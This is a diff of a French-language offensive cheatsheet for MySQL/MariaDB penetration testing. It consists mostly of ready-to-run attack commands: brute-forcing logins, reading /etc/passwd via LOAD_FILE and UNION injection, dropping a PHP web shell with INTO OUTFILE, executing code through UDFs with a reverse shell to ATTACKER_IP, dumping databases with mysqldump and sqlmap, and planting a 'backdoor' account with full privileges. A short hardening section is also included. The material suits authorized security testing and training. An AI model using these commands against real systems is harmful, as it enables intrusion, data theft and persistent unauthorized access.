@@ -1,103 +1,305 @@
+# 🐬 MySQL/MariaDB - Guide Complet
+
+Guide exhaustif pour l'énumération, l'exploitation et la sécurisation de MySQL/MariaDB, le SGBD open source le plus répandu.
+
+---
+
+## 📖 Concepts de Base
+
+**MySQL/MariaDB** : SGBD relationnel open source. En pentesting :
+- Port 3306 par défaut
+- Souvent root sans password (legacy)
+- UDF pour RCE
+- File read/write (LOAD_FILE, INTO OUTFILE)
+- Rapace (Raptor) UDF exploitation
+
+**Port** : `3306`
+
+---
+
+## 1️⃣ Reconnaissance
+
+**Nmap** :
+```bash
+nmap -p 3306 --script mysql-* target.com
+nmap -p 3306 --script mysql-info target.com
+nmap -p 3306 --script mysql-brute target.com
+nmap -p 3306 --script mysql-empty-password target.com
 ```
-# 🐬 MySQL / MariaDB - Cheatsheet Cyber Sécurité
-
-Ce fichier regroupe les **commandes essentielles** et **outils** pour la post-exploitation, l'exploitation, et la persistance sur une base de données MySQL/MariaDB.
 
 ---
 
-## 🔌 Connexion à la base
+## 2️⃣ Connexion
 
-mysql -u root -p  
-> Connexion locale avec mot de passe
+```bash
+# Local
+mysql -u root -p
 
-mysql -h <ip> -u <user> -p  
-> Connexion distante
+# Remote
+mysql -h target.com -u root -p
 
----
+# Sans password
+mysql -h target.com -u root
 
-## 🔍 Énumération
-
-SHOW DATABASES;  
-> Affiche les bases disponibles
-
-USE <database>;  
-> Sélectionner une base
-
-SHOW TABLES;  
-> Tables dans la base sélectionnée
-
-DESCRIBE <table>;  
-> Structure d'une table
-
-SELECT * FROM <table> LIMIT 10;  
-> Lire 10 entrées de la table
-
----
-
-## 🔐 Création d'utilisateur / Persistance
-
-CREATE USER 'backdoor'@'%' IDENTIFIED BY 'P@ss';  
-> Crée un utilisateur distant
-
-GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;  
-> Donne tous les droits
-
-FLUSH PRIVILEGES;  
-> Recharge les privilèges
-
----
-
-## 📥 Dump de base de données
-
-mysqldump -u root -p --all-databases > all.sql  
-> Dump complet
-
-mysqldump -u user -p database > dump.sql  
-> Dump d'une base spécifique
-
----
-
-## 📦 Exploitation avec sqlmap
-
-sqlmap -u "http://target.com/index.php?id=1" --dbs  
-> Détecte les bases disponibles
-
-sqlmap -u "http://target.com/index.php?id=1" -D testdb --tables  
-> Liste les tables de la base testdb
-
-sqlmap -u "http://target.com/index.php?id=1" -D testdb -T users --dump  
-> Dump la table `users`
-
----
-
-## 🧪 Commandes utiles
-
-SELECT version();  
-> Version du serveur
-
-SELECT user();  
-> Nom de l'utilisateur connecté
-
-SELECT @@hostname;  
-> Nom de la machine
-
-SELECT * FROM mysql.user;  
-> Informations sur les utilisateurs (si accès root)
-
----
-
-## 🛠️ Outils utiles
-
-- **mysql** : client CLI
-- **mysqldump** : dump de base
-- **sqlmap** : automatisation des injections SQL
-- **CrackMapExec** : bruteforce SQL sur réseau interne
-
----
-
-## 📌 Ressources utiles
-
-- https://github.com/swisskyrepo/PayloadsAllTheThings
-- https://gtfobins.github.io/gtfobins/mysql/
-- https://book.hacktricks.xyz/pentesting-web/sql-injection
+# Port custom
+mysql -h target.com -P 3307 -u root -p
 ```
+
+---
+
+## 3️⃣ Énumération
+
+```sql
+-- Version
+SELECT @@version;
+SELECT VERSION();
+
+-- User actuel
+SELECT USER();
+SELECT CURRENT_USER();
+SELECT SYSTEM_USER();
+
+-- Database actuelle
+SELECT DATABASE();
+
+-- Databases
+SHOW DATABASES;
+
+-- Tables
+SHOW TABLES;
+SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE();
+
+-- Colonnes
+DESCRIBE table_name;
+SELECT column_name FROM information_schema.columns WHERE table_name='users';
+
+-- Users
+SELECT user, host, authentication_string FROM mysql.user;
+
+-- Privilèges
+SHOW GRANTS;
+SHOW GRANTS FOR 'user'@'host';
+
+-- Variables
+SHOW VARIABLES;
+SELECT @@datadir;
+SELECT @@secure_file_priv;
+```
+
+---
+
+## 4️⃣ Exploitation - File Operations
+
+### Lire fichiers
+
+```sql
+-- LOAD_FILE
+SELECT LOAD_FILE('/etc/passwd');
+SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts');
+
+-- Via UNION
+' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--
+
+-- Hex encode pour bypass
+SELECT HEX(LOAD_FILE('/etc/passwd'));
+```
+
+### Écrire fichiers
+
+```sql
+-- INTO OUTFILE
+SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+
+-- Via UNION
+' UNION SELECT "<?php system($_GET['cmd']); ?>",NULL INTO OUTFILE '/var/www/html/shell.php'--
+
+-- Vérifier secure_file_priv
+SELECT @@secure_file_priv;
+-- Si vide = pas de restriction
+-- Si NULL = désactivé
+-- Si path = limité à ce path
+```
+
+---
+
+## 5️⃣ UDF - User Defined Functions
+
+### Principe
+
+Créer fonctions C/C++ compilées pour exécuter code système.
+
+### Exploitation (Linux)
+
+```sql
+-- Trouver plugin_dir
+SELECT @@plugin_dir;
+
+-- Upload lib_mysqludf_sys.so (via OUTFILE ou autre)
+SELECT BINARY 0x7f454c4... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
+
+-- Créer fonction
+CREATE FUNCTION sys_exec RETURNS int SONAME 'udf.so';
+
+-- Exécuter commande
+SELECT sys_exec('id > /tmp/output.txt');
+SELECT sys_exec('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1');
+```
+
+### Exploitation (Windows)
+
+```sql
+-- Upload DLL
+SELECT BINARY 0x4d5a... INTO DUMPFILE 'C:\\MySQL\\lib\\plugin\\udf.dll';
+
+-- Créer fonction
+CREATE FUNCTION sys_exec RETURNS string SONAME 'udf.dll';
+
+-- Exécuter
+SELECT sys_exec('whoami');
+```
+
+---
+
+## 6️⃣ Brute Force
+
+```bash
+# Hydra
+hydra -l root -P passwords.txt mysql://target.com
+
+# Nmap
+nmap -p 3306 --script mysql-brute target.com
+
+# Metasploit
+use auxiliary/scanner/mysql/mysql_login
+set RHOSTS target.com
+set USER_FILE users.txt
+set PASS_FILE passwords.txt
+run
+```
+
+---
+
+## 7️⃣ Exfiltration
+
+### mysqldump
+
+```bash
+# Dump complet
+mysqldump -h target.com -u root -p --all-databases > all.sql
+
+# Database spécifique
+mysqldump -h target.com -u root -p database_name > db.sql
+
+# Table spécifique
+mysqldump -h target.com -u root -p database_name users > users.sql
+
+# Sans mot de passe (si vide)
+mysqldump -h target.com -u root --all-databases > all.sql
+```
+
+### SQLMap
+
+```bash
+sqlmap -u "http://target.com/page.php?id=1" --dbs
+sqlmap -u "http://target.com/page.php?id=1" -D database --tables
+sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump
+
+# File read
+sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"
+
+# File write
+sqlmap -u "http://target.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
+```
+
+---
+
+## 8️⃣ Persistence
+
+```sql
+-- Créer user
+CREATE USER 'backdoor'@'%' IDENTIFIED BY 'P@ssw0rd123';
+
+-- Tous les privilèges
+GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
+
+-- Reload
+FLUSH PRIVILEGES;
+
+-- Vérifier
+SELECT user, host FROM mysql.user WHERE user='backdoor';
+```
+
+---
+
+## 9️⃣ Protection
+
+```sql
+-- Supprimer users anonymes
+DELETE FROM mysql.user WHERE User='';
+
+-- Désactiver remote root
+DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1');
+
+-- Passwords forts
+ALTER USER 'root'@'localhost' IDENTIFIED BY 'StrongPassword123!';
+
+-- Limiter File privileges
+SET GLOBAL local_infile=0;
+
+-- Secure file priv
+# Dans /etc/mysql/my.cnf
+[mysqld]
+secure_file_priv=/var/lib/mysql-files/
+```
+
+---
+
+## 🔟 Cheatsheet Rapide
+
+```bash
+# === SCAN ===
+nmap -p 3306 --script mysql-* target.com
+
+# === CONNEXION ===
+mysql -h target.com -u root -p
+
+# === ÉNUMÉRATION ===
+SHOW DATABASES;
+SELECT USER();
+SELECT LOAD_FILE('/etc/passwd');
+
+# === FILE WRITE ===
+SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+
+# === UDF ===
+SELECT @@plugin_dir;
+CREATE FUNCTION sys_exec RETURNS int SONAME 'udf.so';
+SELECT sys_exec('id');
+
+# === DUMP ===
+mysqldump -h target.com -u root -p --all-databases > all.sql
+
+# === PERSISTENCE ===
+CREATE USER 'backdoor'@'%' IDENTIFIED BY 'Pass123';
+GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%';
+FLUSH PRIVILEGES;
+```
+
+---
+
+## 1️⃣1️⃣ Resources & Tips
+
+**Resources** :
+- MySQL Docs: https://dev.mysql.com/doc/
+- HackTricks: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql
+- GTFOBins: https://gtfobins.github.io/gtfobins/mysql/
+
+**Tips** :
+1. Root sans password fréquent (legacy)
+2. LOAD_FILE/INTO OUTFILE = file access
+3. UDF = RCE si plugin_dir writable
+4. secure_file_priv critique
+5. SQLMap très efficace
+6. mysqldump pour exfiltration complète
+
+**Tags:** `#mysql #mariadb #database #udf #rce #file-operations #sql-injection #exfiltration`
